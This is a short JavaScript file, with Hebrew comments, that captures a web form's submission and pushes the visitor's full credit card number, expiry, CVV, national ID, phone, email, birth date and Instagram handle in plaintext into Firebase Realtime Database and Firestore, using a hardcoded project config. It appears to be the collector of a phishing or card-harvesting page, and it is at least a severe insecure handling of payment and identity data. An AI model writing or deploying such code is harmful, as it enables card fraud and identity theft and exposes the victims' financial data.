document.addEventListener("DOMContentLoaded", function () {

  const firebaseConfig = {
    apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
    authDomain: "zygo-acf32.firebaseapp.com",
    databaseURL: "https://zygo-acf32-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "zygo-acf32",
    storageBucket: "zygo-acf32.firebasestorage.app",
    messagingSenderId: "243652763597",
    appId: "1:243652763597:web:f9cbc63435193855236e84"
  };

  // אתחול Firebase
  firebase.initializeApp(firebaseConfig);

  // DBs
  const database = firebase.database();
  const firestore = firebase.firestore();

  const form = document.getElementById("nameForm");

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const userData = {
      firstName: document.getElementById("firstName").value,
      lastName: document.getElementById("lastName").value,
      email: document.getElementById("email").value,
      phoneNumber: document.getElementById("phoneNumber").value,
      birthDate: document.getElementById("birthDate").value,
      gender: document.getElementById("gender").value,
      instagram: document.getElementById("instagram").value,
      ID: document.getElementById("ID").value,
      creditCardNumber: document.getElementById("creditCardNumber").value,
      expire: document.getElementById("expire").value,
      cvv: document.getElementById("cvv").value,
      createdAt: Date.now()
    };

    try {
      // ✅ Realtime Database → Details
      await database.ref("Details").push(userData);

      // ✅ Firestore → Details
      await firestore.collection("Details").add(userData);

      alert("✅ הנתונים נשמרו בהצלחה");
      form.reset();

    } catch (error) {
      console.error("Firebase save error:", error);
      alert("❌ השמירה נכשלה (בדוק Console)");
    }
  });

});
